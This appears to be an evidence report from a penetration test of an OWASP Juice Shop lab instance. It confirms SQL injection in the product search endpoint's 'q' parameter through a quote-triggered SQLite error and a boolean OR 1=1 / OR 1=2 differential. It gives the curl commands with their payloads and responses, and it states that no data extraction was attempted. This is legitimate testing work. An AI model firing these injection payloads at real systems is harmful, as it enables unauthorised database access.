# Evidence — SQL injection, GET /rest/products/search (param: q)

Target: http://juice.lab:3000
Candidate: cand_0ba15e4777500a7c86da
Class: sql-injection | Engine: SQLite (Sequelize)
Date: unavailable (runtime timestamp not exposed)

## Baseline (benign input)

    curl -s "http://juice.lab:3000/rest/products/search?q=apple"

    status=200 size=921
    {"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)", ...}]}

## 1b. Syntax-sensitivity probe (single quote)

    curl -s "http://juice.lab:3000/rest/products/search?q=apple%27"

    status=500 size=994
    <title>Error: SQLITE_ERROR: near "'%'": syntax error</title>

Literal quote breaks the SQL string literal -> input reaches the query unparameterized.

## 2a. Boolean differential (repeatable, 2 runs)

TRUE:

    curl -s "http://juice.lab:3000/rest/products/search?q=apple%27%29%29%20OR%201%3D1--"

    status=200 size=21581 data.length=56

FALSE:

    curl -s "http://juice.lab:3000/rest/products/search?q=apple%27%29%29%20OR%201%3D2--"

    status=200 size=30 data.length=0
    {"status":"success","data":[]}

Result identical across two consecutive runs. TRUE returns the full 56-product
catalog; FALSE returns zero rows. Consistent TRUE/FALSE differential establishes
SQLI-2.

## Outcome

confirmed (SQLI-2)
- engine: sqlite
- technique: 1b error-based (signal) + 2a boolean-based (confirmation)
- injection_context: inside a quoted string literal; two closing parens and a
  comment terminator needed to balance the ORM-generated clause
- order: first-order
- phase_2d_used: no — OOB unavailable (no OOB callback tool in this environment)
- phase_3_status: not attempted (no authorization requested for this run)
- proof bounded to confirmation; no UNION extraction, no data dump
